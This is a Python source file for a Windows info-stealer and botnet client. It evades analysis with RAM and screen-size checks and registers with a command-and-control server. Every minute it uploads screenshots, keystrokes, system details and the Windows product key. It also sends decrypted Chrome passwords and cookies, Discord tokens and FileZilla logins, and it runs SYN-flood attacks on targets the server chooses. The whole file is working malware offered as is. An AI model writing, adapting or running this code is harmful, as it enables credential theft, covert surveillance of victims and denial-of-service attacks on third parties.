import os
import re
import ctypes
import platform
import psutil
from datetime import datetime
import time
import requests
import base64
import schedule
import json
import shutil
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from PIL import ImageGrab
import xml.etree.ElementTree as ET
from pynput.keyboard import Key, Listener
import scapy.all as scapy

APP_DATA = os.environ['LOCALAPPDATA']
API_URL = "http://localhost:4000"
CONFIG_PATH = "config.txt"
BOOT_CONFIG_PATH = "boot.txt"
SCREENSHOT_PATH = "screenshot.jpg"
LOG_PATH = "logs.txt"

class b64():
    def encrypt(self, text):
        return base64.b64encode(text.encode("utf-8")).decode("utf-8")

    def decrypt(self, text):
        return base64.b64decode(text.encode("utf-8")).decode("utf-8")

class AntiVM():
	def __init__(self):
		self.vm = False

	def ram_check(self):
		class MemoryStatus(ctypes.Structure):
			_fields_ = [
				("dwLength", ctypes.c_ulong),
				("dwMemoryLoad", ctypes.c_ulong),
				("ullTotalPhys", ctypes.c_ulonglong),
				("ullAvailPhys", ctypes.c_ulonglong),
				("ullTotalPageFile", ctypes.c_ulonglong),
				("ullAvailPageFile", ctypes.c_ulonglong),
				("ullTotalVirtual", ctypes.c_ulonglong),
				("ullAvailVirtual", ctypes.c_ulonglong),
				("sullAvailExtendedVirtual", ctypes.c_ulonglong),
			]
		m = MemoryStatus()
		m.dwLength = ctypes.sizeof(m)
		ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m))
		ram = m.ullTotalPhys/1073741824
		if ram <= 2:
			self.vm = True

	def screen_size(self):
		x = ctypes.windll.user32.GetSystemMetrics(0)
		y = ctypes.windll.user32.GetSystemMetrics(1)
		if x < 800 or y < 600:
			self.vm = True

	def inVM(self):
		self.ram_check()
		self.screen_size()
		return self.vm

class ApiController():
    def __init__(self):
        self.api_url = API_URL
        self.boot_config_path = BOOT_CONFIG_PATH
        self.screenshot_path = SCREENSHOT_PATH
        self.log_path = LOG_PATH

    def check_connection(self):
        try:
            r = requests.get(self.api_url)
            if r.status_code == 200:
                return True
            else:
                return False
        except:
            return False
        
    def check_account(self, identifier, token):
        r = requests.get(f"{self.api_url}/bots/check/{identifier}/{token}")
        if r.status_code == 200:
            return True
        else:
            return False

    def register_account(self):
        r = requests.post(f"{self.api_url}/bots/register")
        if r.status_code == 200:
            return [r.json()["identifier"], r.json()["token"]]
        else:
            return False

    def get_size(self, bytes, suffix="B"):
        factor = 1024
        for unit in ["", "K", "M", "G", "T", "P"]:
            if bytes < factor:
                return f"{bytes:.2f}{unit}{suffix}"
            bytes /= factor

    def update_details(self, identifier, token):
        if self.check_connection():
            uname = platform.uname()

            boot_time_timestamp = psutil.boot_time()
            bt = datetime.fromtimestamp(boot_time_timestamp)

            w_key = ""
            try:    
                w_key = os.popen("wmic path softwarelicensingservice get OA3xOriginalProductKey").read().strip("OA3xOriginalProductKeyn\n").strip()
            except:
                pass
                
            hwid = ""
            try:
                hwid = os.popen("wmic csproduct get uuid")
            except:
                pass
                
            post_data = {
                "operating_system": uname.system,
                "node_name": uname.node,
                "release": uname.release,
                "version": uname.version,
                "processor": uname.processor,
                "architecture": uname.machine,
                "boot_time": f"{bt.year}-{bt.month}-{bt.day} {bt.hour}:{bt.minute}:{bt.second}",
                "cpu_cores": psutil.cpu_count(logical=True),
                "memory": self.get_size(psutil.virtual_memory().total),
                "windows_key": w_key
            }

            requests.post(f"{self.api_url}/update/details/{identifier}/{token}", json=post_data)

    def update_screenshot(self, identifier, token):
        if self.check_connection():
            image = ImageGrab.grab()
            image.save(self.screenshot_path)
            
            post_file = {"file": (self.screenshot_path, open(self.screenshot_path, "rb"))}

            requests.post(f"{self.api_url}/update/screenshot/{identifier}/{token}", files=post_file)

    def update_chrome(self, identifier, token, data):
        if self.check_connection():
            for d in data:
                post_data = {
                    "host": d["host"],
                    "user": d["user"],
                    "password": d["pass"]
                }

                requests.post(f"{self.api_url}/update/chrome/{identifier}/{token}", json=post_data)

    def update_cookies(self, identifier, token, data):
        if self.check_connection():
            post_data = {
                "cookies": data
            }

            requests.post(f"{self.api_url}/update/cookies/{identifier}/{token}", json=post_data)

    def update_discord(self, identifier, token, data):
        if self.check_connection():
            post_data = {
                "tokens": data
            }

            requests.post(f"{self.api_url}/update/discord/{identifier}/{token}", json=post_data)

    def update_filezilla(self, identifier, token, data):
        if self.check_connection():
            for d in data:
                post_data = {
                    "host": d["host"],
                    "port": d["port"],
                    "user": d["user"],
                    "password": d["pass"]
                }

                requests.post(f"{self.api_url}/update/filezilla/{identifier}/{token}", json=post_data)

    def update_logs(self, identifier, token):
        if self.check_connection() and os.path.isfile(self.log_path):
            post_file = {"file": (self.log_path, open(self.log_path, "rb"))}

            requests.post(f"{self.api_url}/update/keylogger/{identifier}/{token}", files=post_file)

    def check_boot(self, identifier, token):
        if self.check_connection():
            boot_data = requests.get(f"{self.api_url}/boot/{identifier}/{token}")

            if boot_data.status_code == 200:
                data = boot_data.json()
                if os.path.isfile(self.boot_config_path):
                    if isinstance(data, dict) and data["ip"] != None:

                        if data["ip"] != None:

                            f = open(self.boot_config_path, "r").read()
                            if f != data["identifier"]:
                                f = open(self.boot_config_path, "w+")
                                f.write(data["identifier"])
                                f.close()
                                return data
                            else:
                                return False

                        else:
                            return False

                    else:
                        return False
                        
                else:
                    if isinstance(data, dict):
                        if data["ip"] != None:
                            f = open(self.boot_config_path, "w+")
                            f.write(data["identifier"])
                            f.close()
                            return data
                        else:
                            return False
                    else:
                        return False
            else: 
                return False

class FileController():
    def __init__(self):
        self.config_path = CONFIG_PATH

    def check_file(self, filename):
        if os.path.isfile(filename):
            return True
        else:
            return False

    def delete_file(self, filename):
        os.remove(filename)

    def save_creds(self, identifier, token):
        f = open(self.config_path, "w+")
        f.write(f"{identifier}:{token}")
        f.close()

    def get_creds(self):
        f = open(self.config_path, "r").read()
        if ":" in f:
            l = f.split(":")
            return [l[0], l[1]]
        else:
            return False 

class Chrome(object):
    def __init__(self):
        self.stored = []
        self.lad = os.environ["LOCALAPPDATA"]
        self.temp = os.environ["APPDATA"] + "Predat0r"

    def chrome_key(self):
        with open(os.path.join(self.lad, "Google\\Chrome\\User Data\\Local State"), encoding="utf-8") as k:
            ck = json.loads(k.read())
        return win32crypt.CryptUnprotectData(
            base64.b64decode(ck["os_crypt"]["encrypted_key"])[5:],
            None,
            None,
            None,
            0)[1]

    def locate_db(self):
        full_path = os.path.join(APP_DATA, "Google\\Chrome\\User Data\\Default\\Login Data")
        temp_path = os.path.join(APP_DATA, "sqlite_file")
        if os.path.exists(temp_path): 
            os.remove(temp_path)
        shutil.copyfile(full_path, temp_path)
        return full_path

    def decrypt_pass(self, cont):
        try:
            iv = cont[3:15]
            data = cont[15:]
            ciph = AES.new(self.chrome_key(), AES.MODE_GCM, iv)
            decrypted = ciph.decrypt(data)
            decrypted = decrypted[:-16].decode()
            return decrypted
        except:
            decrypted = win32crypt.CryptUnprotectData(cont, None, None, None, 0)
            return decrypted[1]

    def dump(self):
        try:
            db = self.locate_db()
            db2 = shutil.copy(db, APP_DATA)
            conn = sqlite3.connect(db2)
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value  from logins")
            for item in cursor.fetchall():
                if item[0] != "":
                    self.stored.append({"host": item[0], "user": item[1], "pass": self.decrypt_pass(item[2])})
        except:
            pass
        return self.stored

class Cookies(object):
    def __init__(self):
        self.stored = ""
        self.lad = os.environ["LOCALAPPDATA"]
        self.temp = os.environ["APPDATA"] + "Angst"

    def chrome_key(self):
        with open(os.path.join(self.lad,
                                "Google\\Chrome\\User Data\\Local State"),
                 encoding="utf-8") as k:
            ck = json.loads(k.read())
        return win32crypt.CryptUnprotectData(
                    base64.b64decode(ck["os_crypt"]["encrypted_key"])[5:],
                    None,
                    None,
                    None,
                    0)[1]

    def locate_db(self):
        full_path = os.path.join(APP_DATA, "Google\\Chrome\\User Data\\Default\\Cookies")
        temp_path = os.path.join(APP_DATA,"sqlite_file")
        if os.path.exists(full_path): os.remove(temp_path)
        shutil.copyfile(full_path, temp_path)
        return full_path

    def decrypt_pass(self, cont):
        try:
            iv = cont[3:15]
            data = cont[15:]
            ciph = AES.new(self.chrome_key(), AES.MODE_GCM, iv)

            decrypted = ciph.decrypt(data)
            decrypted = decrypted[:-16].decode()
            return decrypted
        except Exception as e:
            data = win32crypt.CryptUnprotectData(
                    cont,
                    None,
                    None,
                    None,
                    0)
            return data

    def dump(self):
        try:
            db = self.locate_db()
            db2 = shutil.copy(db, APP_DATA)
            conn = sqlite3.connect(db2)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
            for item in cursor.fetchall():
                if item[0] != "":
                    self.stored += f"HOST: {item[0]}\nNAME: {item[1]}\nCOOKIE: {self.decrypt_pass(item[2])}\n\n"
        except Exception as e:
            pass
        return self.stored

class Discord():
    def __init__(self):
        self.tokens = []
        self.saved = ""
        self.regex = r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}"

    def discord(self):
        discordPaths = [
            os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb",
            os.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb",
            os.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb"
        ]

        for location in discordPaths:
            try:
                if os.path.exists(location):
                    for file in os.listdir(location):
                        with open(f"{location}\\{file}", errors="ignore") as _data:
                            regex = re.findall(self.regex, _data.read())
                            if regex:
                                for token in regex:
                                    self.tokens.append(token)
            except:
                pass

    def chrome(self):
        chromie = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"
        try:
            if os.path.exists(chromie):
                for file in os.listdir(chromie):
                    with open(f"{chromie}\\{file}", errors="ignore") as _data:
                        regex = re.findall(self.regex, _data.read())
                        if regex:
                            for token in regex:
                                self.tokens.append(token)
        except Exception as e:
            pass

    def neatify(self):
        self.discord()
        for token in set(self.tokens):
            self.saved += "TOKEN: %s\n" % token

    def dump(self):
        self.neatify()
        return self.saved

class Filezilla(object):

    def __init__(self):
        self.saved = []
        self.grab_saved()

    def grab_saved(self):
        filezilla =  os.path.join(os.getenv("APPDATA"), "FileZilla")
        if os.path.exists(filezilla):
            saved_pass_file = os.path.join(filezilla, "recentservers.xml")
            if os.path.exists(saved_pass_file):
                xml_tree = ET.parse(saved_pass_file).getroot()
                if xml_tree.findall("RecentServers/Server"):
                    servers = xml_tree.findall("RecentServers/Server")
                else:
                    servers = xml_tree.findall("Servers/Server")
 
                for server in servers:
                    host = server.find("Host")
                    port = server.find("Port")
                    user = server.find("User")
                    password = server.find("Pass")
                    full_pass = base64.b64decode(password.text).decode()
                    self.saved.append({"host": host.text, "port": port.text, "user": user.text, "pass": full_pass})

    def dump(self):
        self.grab_saved()
        return self.saved

class KeyLogger():
    def __init__(self):
        self.log_path = LOG_PATH
        self.word_counts = 0
        self.keys = []

    def get_date(self):
        return time.strftime("%d/%m/%Y %H:%M:%S %z | ")

    def on_press(self, key):
        self.keys.append(key)
        self.word_counts += 1
        if(self.word_counts >= 15):
            self.word_counts = 0
            self.keys.append("\n")
            self.keys.insert(0, self.get_date())
            self.write_file(self.keys)
            self.keys = []

    def write_file(self, key_arr):
        with open(self.log_path, "a") as f:
            for key in key_arr:
                ke = str(key).replace("'", "")
                if ke.find("Key.") != -1:
                    f.write(ke.replace("Key.", "<") + ">")
                if ke.find("Key") == -1:
                    f.write(ke)

class Booter():
    def boot(self, boot_data):
        if isinstance(boot_data, dict):
            t_end = time.time() + 60 * int(boot_data["duration"])
            while time.time() < t_end:
                target_ip = boot_data["ip"]
                target_port = int(boot_data["port"])

                ip = scapy.IP(dst=target_ip)
                tcp = scapy.TCP(sport=scapy.RandShort(), dport=target_port, flags="S")
                raw = scapy.Raw(b"X"*1024)
                p = ip / tcp / raw

                scapy.send(p, loop=0, verbose=0)

def main():
    if(AntiVM().inVM()):
        exit()
    else:
        api = ApiController()
        fsc = FileController()

        if api.check_connection():
            if fsc.check_file(CONFIG_PATH):
                bot_data = fsc.get_creds()
            
                if bot_data and isinstance(bot_data, list):
                    try:
                        bot_identifier = b64().decrypt(bot_data[0])
                        bot_token = b64().decrypt(bot_data[1])
                    except:
                        os.remove(CONFIG_PATH)
                        bot_data = api.register_account()
                        fsc.save_creds(b64().encrypt(bot_data[0]), b64().encrypt(bot_data[1]))
                        main()
                    
                    if api.check_account(bot_identifier, bot_token):
                        logger = KeyLogger()
                        listener = Listener(on_press=logger.on_press)
                        listener.start()

                        schedule.every(1).minutes.do(lambda: Booter().boot(api.check_boot(bot_identifier, bot_token)))
                        schedule.every(1).minutes.do(lambda: api.update_details(bot_identifier, bot_token))
                        schedule.every(1).minutes.do(lambda: api.update_screenshot(bot_identifier, bot_token))
                        schedule.every(1).minutes.do(lambda: api.update_logs(bot_identifier, bot_token))
                        schedule.every(1).minutes.do(lambda: api.update_chrome(bot_identifier, bot_token, Chrome().dump()))
                        schedule.every(1).minutes.do(lambda: api.update_cookies(bot_identifier, bot_token, Cookies().dump()))
                        schedule.every(1).minutes.do(lambda: api.update_discord(bot_identifier, bot_token, Discord().dump()))
                        schedule.every(1).minutes.do(lambda: api.update_filezilla(bot_identifier, bot_token, Filezilla().dump()))

                        while True:
                            schedule.run_pending()
                            time.sleep(1)
                    else:
                        os.remove(CONFIG_PATH)
                        bot_data = api.register_account()
                        fsc.save_creds(b64().encrypt(bot_data[0]), b64().encrypt(bot_data[1]))
                        main()

                else:
                    os.remove(CONFIG_PATH)
                    bot_data = api.register_account()
                    fsc.save_creds(b64().encrypt(bot_data[0]), b64().encrypt(bot_data[1]))
                    main()
            else:
                bot_data = api.register_account()
                fsc.save_creds(b64().encrypt(bot_data[0]), b64().encrypt(bot_data[1]))
                main()
        else:
            time.sleep(30)
            main()

if __name__ == "__main__":
    main()